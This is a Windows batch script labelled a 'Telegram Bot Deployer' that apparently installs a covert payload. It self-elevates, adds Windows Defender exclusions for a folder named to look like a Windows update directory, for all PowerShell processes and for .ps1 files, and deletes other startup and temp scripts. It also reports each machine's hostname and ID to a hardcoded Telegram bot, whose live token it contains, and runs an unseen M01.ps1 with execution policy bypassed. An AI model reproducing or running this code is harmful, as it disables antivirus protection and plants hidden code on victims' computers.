@echo off
title Telegram Bot Deployer
color 0A

net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

setlocal enabledelayedexpansion
set "SCRIPT_DIR=%~dp0"

echo ========================================
echo    TELEGRAM BOT DEPLOYER
echo ========================================
echo.

powershell -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData\WindowUpdate' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'powershell.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionExtension '.ps1' -ErrorAction SilentlyContinue" >nul 2>&1

echo [INFO] Defender exclusions added.
echo.
echo [INFO] Scanning for deployment scripts...
echo.

:: ============================================================
:: AUTO-SELECT M01.ps1 (no menu, no choice prompt)
:: ============================================================
set "SELECTED=M01.ps1"
set "LABEL=Tedi Lab 1"
set "TOTAL=1"

if not exist "%SCRIPT_DIR%M01.ps1" (
    echo.
    echo [ERROR] Required script M01.ps1 not found in:
    echo         %SCRIPT_DIR%
    echo.
    pause
    exit /b 1
)

echo [INFO] Auto-selected : !LABEL! (!SELECTED!)
echo.

set "FOUND_SCRIPT=%SCRIPT_DIR%!SELECTED!"

:: ========================================
:: COMPUTER ID PROMPT (cannot be empty)
:: ========================================
echo ========================================
echo    COMPUTER IDENTIFICATION
echo ========================================
echo.

:ask_id
set "COMPUTER_ID="
set /p COMPUTER_ID="Enter ComputerID: "

set "COMPUTER_ID=!COMPUTER_ID:"=!"

if "!COMPUTER_ID!"=="" (
    echo.
    powershell -Command "Write-Host '  [ERROR] ComputerID cannot be empty. Please try again.' -ForegroundColor Red"
    echo.
    goto :ask_id
)

echo.
echo [INFO] Selected Lab   : !LABEL! (!SELECTED!)
echo [INFO] ComputerID     : !COMPUTER_ID!
echo [INFO] Hostname       : %COMPUTERNAME%
echo [INFO] Deploying...
echo.

:: ========================================
:: CLEAN PREVIOUS DEPLOYMENTS (except systg in AppData)
:: ========================================
echo ========================================
echo    CLEANING PREVIOUS DEPLOYMENTS
echo ========================================
echo.
echo [INFO] Removing old deployment files (preserving 'systg' in AppData)...
echo.

powershell -NoProfile -Command ^
  "$ErrorActionPreference='SilentlyContinue';" ^
  "$removed=0;" ^
  "$protected=@('systg');" ^
  "$targets=@(" ^
  "  \"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\*.lnk\"," ^
  "  \"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\*.vbs\"," ^
  "  \"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\*.bat\"," ^
  "  \"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\*.cmd\"," ^
  "  \"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\*.ps1\"," ^
  "  \"$env:PROGRAMDATA\Microsoft\Windows\Start Menu\Programs\Startup\*.lnk\"," ^
  "  \"$env:PROGRAMDATA\Microsoft\Windows\Start Menu\Programs\Startup\*.vbs\"," ^
  "  \"$env:PROGRAMDATA\Microsoft\Windows\Start Menu\Programs\Startup\*.bat\"," ^
  "  \"$env:PROGRAMDATA\Microsoft\Windows\Start Menu\Programs\Startup\*.cmd\"," ^
  "  \"$env:PROGRAMDATA\Microsoft\Windows\Start Menu\Programs\Startup\*.ps1\"," ^
  "  \"$env:TEMP\*.ps1\"," ^
  "  \"$env:TEMP\*.vbs\"," ^
  "  \"$env:TEMP\*.bat\"," ^
  "  \"$env:TEMP\*.cmd\"," ^
  "  \"$env:TEMP\*.lnk\"," ^
  "  \"C:\ProgramData\WindowUpdate\*\"," ^
  "  \"$env:LOCALAPPDATA\Temp\*.ps1\"," ^
  "  \"$env:LOCALAPPDATA\Temp\*.vbs\"," ^
  "  \"$env:LOCALAPPDATA\Temp\*.bat\"" ^
  ");" ^
  "foreach($t in $targets){" ^
  "  Get-Item $t -ErrorAction SilentlyContinue | ForEach-Object {" ^
  "    $n=$_.Name;" ^
  "    $skip=$false;" ^
  "    foreach($p in $protected){ if($n -like \"*$p*\"){ $skip=$true; break } }" ^
  "    if(-not $skip){ Remove-Item $_.FullName -Force -Recurse -ErrorAction SilentlyContinue; if(-not (Test-Path $_.FullName)){ $removed++ } }" ^
  "  }" ^
  "};" ^
  "Write-Host ('  [OK] Removed ' + $removed + ' old deployment file(s).') -ForegroundColor Yellow;" ^
  "Write-Host '  [OK] Preserved: systg folder in AppData.' -ForegroundColor Green"

if exist "C:\ProgramData\WindowUpdate\" (
    for /d %%D in ("C:\ProgramData\WindowUpdate\*") do (
        echo %%D | findstr /i "systg" >nul
        if errorlevel 1 (
            rd /s /q "%%D" >nul 2>&1
        )
    )
)

echo.
echo ========================================
echo    CLEANUP COMPLETE - STARTING DEPLOYMENT
echo ========================================
echo.

:: ========================================
:: SEND IDENTIFICATION TO TELEGRAM
:: ========================================
powershell -Command "$token = '8425297013:AAG42OM97dT64vT9V4CVkiF-0n9nCqP8BSI'; $chat = '7303070402'; $msg = \"MACHINE IDENTIFIED`n`n----------------------`nLab        : !LABEL!`nComputerID : !COMPUTER_ID!`nHostname   : %COMPUTERNAME%`nTime       : $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n----------------------\"; $uri = 'https://api.telegram.org/bot' + $token + '/sendMessage'; Invoke-RestMethod -Uri $uri -Method Post -Body @{chat_id=$chat; text=$msg} | Out-Null"

echo [INFO] Identification sent to Telegram.
echo.

:: ========================================
:: DEPLOY
:: ========================================
powershell -NoProfile -ExecutionPolicy Bypass -File "%FOUND_SCRIPT%"

if %errorlevel% equ 0 (
    echo.
    echo ========================================
    powershell -Command "Write-Host '   DEPLOYMENT SUCCESSFUL!' -ForegroundColor Green"
    echo ========================================
    echo.
    echo [INFO] Deployed on host: %COMPUTERNAME%
    echo [INFO] ComputerID      : !COMPUTER_ID!
    echo.

    powershell -Command "$token = '8425297013:AAG42OM97dT64vT9V4CVkiF-0n9nCqP8BSI'; $chat = '7303070402'; $msg = \"DEPLOYMENT SUCCESSFUL`n`n----------------------`nLab        : !LABEL!`nScript     : !SELECTED!`nComputerID : !COMPUTER_ID!`nHostname   : %COMPUTERNAME%`nTime       : $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n----------------------\"; $uri = 'https://api.telegram.org/bot' + $token + '/sendMessage'; Invoke-RestMethod -Uri $uri -Method Post -Body @{chat_id=$chat; text=$msg} | Out-Null"

    echo [INFO] Telegram notification sent.
    echo.
) else (
    echo.
    echo ========================================
    powershell -Command "Write-Host '   DEPLOYMENT FAILED!' -ForegroundColor Red"
    echo ========================================
    echo.

    powershell -Command "$token = '8425297013:AAG42OM97dT64vT9V4CVkiF-0n9nCqP8BSI'; $chat = '7303070402'; $msg = \"DEPLOYMENT FAILED`n`n----------------------`nLab        : !LABEL!`nScript     : !SELECTED!`nComputerID : !COMPUTER_ID!`nHostname   : %COMPUTERNAME%`nTime       : $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n----------------------\"; $uri = 'https://api.telegram.org/bot' + $token + '/sendMessage'; Invoke-RestMethod -Uri $uri -Method Post -Body @{chat_id=$chat; text=$msg} | Out-Null"

    echo [INFO] Failure notification sent.
    echo.
)

echo.
pause
exit /b 0
